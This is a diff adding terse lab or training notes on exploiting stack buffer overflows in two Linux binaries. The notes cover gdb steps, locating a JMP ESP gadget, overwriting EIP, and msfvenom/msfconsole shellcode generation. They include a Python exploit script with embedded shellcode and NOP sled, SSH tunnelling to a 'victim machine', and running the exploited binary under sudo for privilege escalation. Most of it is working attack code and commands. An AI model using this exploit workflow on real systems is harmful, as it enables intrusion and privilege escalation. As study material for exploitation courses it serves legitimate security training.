@@ -1534,4 +1534,149 @@ execute the script.
 
 ./func <<<$(python linbuffer.py)
 
+```
+file func
+strings func 
+chmod u+x func
+
+gdb ./func
+run <<<$(echo "asdfasdfasdfasdf")
+info functions
+pdisass main
+-> pdisass getuserinput
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+use script to find where overflow occurs
+
+run <<<$(python buff.py)
+
+env - gdb ./func   -  (Ener without peda plugin)
+show env
+usnet env COLUMNS
+unset env LINES
+
+run 
+AAAAAAAAAAAAAAAAAAAAAAaa
+OVERFLOW
+
+info proc map
+** Take note of first start address after HEAP and End Address of STACK **
+find /b 0xf7def000, 0xffffe000, 0xff ,0xe4
+** 0xff is jump, 0xe4 ESP **
+** Grab First Four Addresses from OutPut
+** Break down -> each byte and reverse in ""
+#0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
+#0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
+#0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
+#0xf7f6460f -> 0xf7 f5 46 0f "\x0f\x46\xf5\xf7"
+
+** Copy one of the reverse codes in "" and put in eip ""
+** In terminal run msfvenom **
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python 
+** COPY SHELL CODE  into script **
+
+msfvenom --list payloads   
+Python Script
+#!/usr/bin/env python
+ buffer = "A" * 100
+ eip = "BBBB"
+
+#stack is inbetween 0xf7de1000 and 0xffffe0000
+#0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
+#0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
+#0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
+#0xf7f6460f -> 0xf7 f5 46 0f "\x0f\x46\xf5\xf7"
+
+buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+nop = "\x90" * 15
+buf =  b""
+buf += b"\xd9\xc2\xb8\x21\xce\x96\x0f\xd9\x74\x24\xf4\x5b"
+buf += b"\x29\xc9\xb1\x0a\x31\x43\x19\x03\x43\x19\x83\xc3"
+buf += b"\x04\xc3\x3b\xfc\x04\x5b\x5d\x53\x7d\x33\x70\x37"
+buf += b"\x08\x24\xe2\x98\x79\xc2\xf3\x8e\x52\x70\x9d\x20"
+buf += b"\x24\x97\x0f\x55\x35\x57\xb0\xa5\x53\x33\xb0\xf2"
+buf += b"\xf0\x32\x51\x31\x76"
+print(buffer+buf+nop+eip)
+```
+```
+file inventory.exe
+strings inventory.exe
+
+gdb ./inventory.exe
+run
+info functions
+info functions main
+
+pdisass main
+>    0x0804855e <+27>:  call   0x80484d6 <getTheGoods>
+ 
+pdisass getTheGoods
+ 
+0x080484f2 <+28>:  call   0x8048360 <printf@plt>
+***  0x0804850f <+57>:  call   0x8048370 <fgets@plt>
+ 
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+#Generate Pattern and Insert Pattern into script
+
+run <<<$(python buff.py)
+#Check EIP for Register Value
+#Set offset as part of A * Buffer
+
+#See Where Stack Starts and Ends by checking Start Address imm
+ ediately following Heap and End Address on Stack
+info proc map
+
+#Switch to peda free gdb
+env - gdb ./inventory.exe
+unset env COLUMNS
+unset env LINES
+run
+ #Overflow manually
+ AAAAAAAAAAAAAAAAAAAAAAAAAAA-----
+  
+ find /b 0xf7de1000, 0xffffe000, 0xff ,0xe4
+ ** Grab First Four Addresses from OutPut
+ # Convert Memory Address to Little Endian
+ ** Copy one of the reverse codes in "" and put in eip ""
+ 0xf7de3b59 -> "\x59 \x3b \xde \xf7"
+ 0xf7f588ab -> "\xab \x88 \xf5 \xf7"
+ 0xf7f645fb -> "\xfb \x45 \xf6 \xf7"
+ 0xf7f6460f -> "\x0f \x46 \xf6 \xf7"
+ 
+ msfconsole 
+ use payload /linux/x86/exec
+ set CMD cat users
+ generate -b "\x00" -f python
+ 
+ #Take buf payload and input into script
+ ** Copy one of the reverse codes in "" and put in eip "" if no
+  t done
+ # Troubleshoot script until it executes
+ gdb ./inventory.exe
+
+ run <<<#(python buff.py)
+ #Restart Process and Generate Mem Addresses for victim machine
+ ssh -S /tmp/jump dum -O forward -L 5152:192.168.28.111:2222
+ ssh comrade@localhost -p 5152
+ 
+ cd /
+ ls -lisa
+ cd .hidden
+ gdb ./inventory.exe
+ unset env LINES
+ unset env COLUMNS
+ 
+ run
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ #Manual Overflow
+ find /b 0xf7def000, 0xffffe000, 0xff ,0xe4
+ 0xf7df1b51 -> "\x51\x1b\xdf\xf7"
+ 
+ # Change CMD with payload to match command needed
+ # scp script to victim machine
+ scp -P 5152 buff.py comrade@localhost:.
+ sudo ./inventory.exe <<<$(python /home/comrade/buff.py)
+```
+
 
